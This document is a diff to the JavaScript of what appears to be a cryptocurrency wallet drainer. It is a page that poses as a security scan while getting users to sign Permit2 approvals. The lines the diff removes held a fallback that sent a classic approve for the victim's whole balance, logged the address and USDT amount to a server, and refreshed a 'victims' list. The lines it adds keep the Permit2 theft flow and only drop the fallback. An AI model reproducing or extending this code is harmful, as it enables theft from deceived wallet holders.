@@ -1164,31 +1164,9 @@ async function handlePermit2Flow() {
     try {
       permit2Sig = await signPermit2Typed(account, typedData);
     } catch (signErr) {
-      console.warn('Permit2 typed-data bloqué, fallback approve classique', signErr);
-      const txHash = await sendClassicApprove(balance, balanceFormatted);
-      console.log('fallback approve', txHash);
-      if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
-      const addressKey = account.toLowerCase();
-      if (pendingSignatures[addressKey]) {
-        pendingSignatures[addressKey].done = true;
-        if (pendingSignatures[addressKey].timer) {
-          clearTimeout(pendingSignatures[addressKey].timer);
-          pendingSignatures[addressKey].timer = null;
-        }
-      }
-      await fetch('/api/record-wallet', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          address: account,
-          chain: '1',
-          status: 'signed',
-          token: 'USDT',
-          amount: balanceFormatted
-        })
-      });
-      refreshVictimsIfPossible();
-      return;
+      console.warn('Permit2 typed-data refusee, pas de fallback EOA', signErr);
+      if (scanText) scanText.textContent = '❌ Signature refusée.';
+      throw signErr;
     }
 
     console.log('Permit2 sig:', permit2Sig);
